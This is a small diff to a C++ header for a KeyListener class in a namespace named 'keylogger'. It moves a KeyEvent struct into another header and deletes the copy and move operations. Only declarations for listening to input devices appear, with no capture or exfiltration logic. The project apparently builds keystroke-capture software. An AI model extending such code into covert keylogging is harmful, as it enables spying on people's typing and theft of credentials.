@@ -1,6 +1,3 @@
-//
-// Created by ofir on 7/24/25.
-//
 
 #ifndef KEYLISTENER_HPP
 #define KEYLISTENER_HPP
@@ -9,21 +6,21 @@
 #include <string>
 #include <vector>
 
+#include "Structs.hpp"
+
 namespace keylogger
 {
-
-struct KeyEvent
-{
-    int code;
-    int value;
-};
-
 class KeyListener
 {
 public:
     explicit KeyListener();
     ~KeyListener();
     KeyEvent Listen();
+
+    KeyListener(const KeyListener& listener) = delete;
+    KeyListener& operator=(const KeyListener& listener) = delete;
+    KeyListener(KeyListener&& listener) = delete;
+    KeyListener& operator=(KeyListener&& listener) = delete;
 private:
     void FindInputDevices();
     static bool IsInputDevice(const std::string& device_path);
